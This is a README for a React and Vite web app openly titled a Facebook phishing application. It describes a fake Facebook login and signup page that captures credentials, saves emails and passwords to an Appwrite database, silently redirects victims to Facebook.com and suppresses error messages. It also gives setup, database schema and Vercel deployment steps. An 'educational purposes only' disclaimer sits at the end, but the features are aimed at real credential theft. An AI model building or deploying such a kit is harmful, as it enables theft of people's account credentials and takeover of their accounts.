# Facebook Phishing Application

A React application built with Vite that simulates a Facebook login interface for educational purposes.

## Features

- **Login Flow**: Simulates Facebook login with credential capture
- **Signup Flow**: Simulates Facebook registration with credential capture  
- **Database Integration**: Saves credentials to Appwrite database
- **Seamless Redirect**: Redirects to Facebook.com after credential submission
- **No Error Messages**: Prevents user alerts for smooth operation

## Technology Stack

- **Frontend**: React 19 + Vite
- **Routing**: React Router DOM
- **Database**: Appwrite (configured for credential storage)
- **Styling**: CSS-in-JS

## Installation

1. Clone the repository
2. Install dependencies:
   ```bash
   npm install
   ```
3. Start development server:
   ```bash
   npm run dev
   ```
4. Open http://localhost:5173 in your browser

## Database Setup

To properly store credentials, configure your Appwrite database:

1. Create database with ID: `69b2a105003247b3a7e6`
2. Create collection named `accounts`
3. Add required attributes:
   - `email` (String, Required)
   - `password` (String, Required)

## Deployment

This project is configured for Vercel deployment:

1. Push to GitHub
2. Connect repository to Vercel
3. Deploy automatically

## Important Notes

⚠️ **This is for educational purposes only**
- Do not use for malicious activities
- Ensure proper authorization before testing
- Comply with all applicable laws and regulations

## License

ISC